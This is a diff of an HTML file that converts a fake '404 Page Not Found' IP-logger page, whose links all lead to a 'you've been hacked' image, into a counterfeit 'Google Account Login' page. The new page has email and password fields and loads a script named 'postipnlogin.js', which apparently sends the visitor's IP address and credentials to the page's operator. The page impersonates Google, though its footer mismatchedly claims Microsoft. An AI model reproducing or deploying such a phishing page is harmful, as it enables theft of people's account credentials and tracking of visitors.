@@ -1,28 +1,32 @@
-<!-- give all credit to elk https://github.com/3elk/Website-IP-Logger -->
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Page Not Found :(</title>
+    <title>Google Account Login</title>
     <link rel="stylesheet" href="style.css">
 </head>
 <body>
-    <div class="container">
-        <h1>404 - Page Not Found :(</h1>
-        <p>Oops! The page you are looking for might have been removed, had its name changed, or is temporarily unavailable.</p>
-        <div class="search-bar">
-            <input type="text" placeholder="Type here . . ." />
+    <div class="login-container">
+        <div class="logo">
+            <img src="Google_Logo.png" alt="Google Logo">
         </div>
-        <p>
-            <a href="https://armitha-cyber.github.io/IP-Logger/youvebeenhacked.gif">Visit our homepage</a> | 
-            <a href="https://armitha-cyber.github.io/IP-Logger/youvebeenhacked.gif">Check out our latest articles</a> | 
-            <a href="https://armitha-cyber.github.io/IP-Logger/youvebeenhacked.gif">Browse our FAQs</a>
-        </p> <!-- all links changeable -->
+        <form id="loginForm">
+            <div class="form-group">
+                <label for="email">Email or Phone</label>
+                <input type="email" id="email" name="email" placeholder="Enter your email" required>
+            </div>
+            <div class="form-group">
+                <label for="password">Password</label>
+                <input type="password" id="password" name="password" placeholder="Enter your password" required>
+            </div>
+            <button type="submit" class="login-button">Sign in</button>
+        </form>
+        <script src="postipnlogin.js"></script>
     </div>
     <script defer src="script.js"></script>
-    <footer>
-        Contact us: <a href="https://armitha-cyber.github.io/IP-Logger/youvebeenhacked.gif">youve@beenhacked.com</a> <!-- all changeable-->
-    </footer>
+    <div class="footer">
+            <p>© Microsoft 2025. All rights reserved.</p>
+    </div>>
 </body>
 </html>
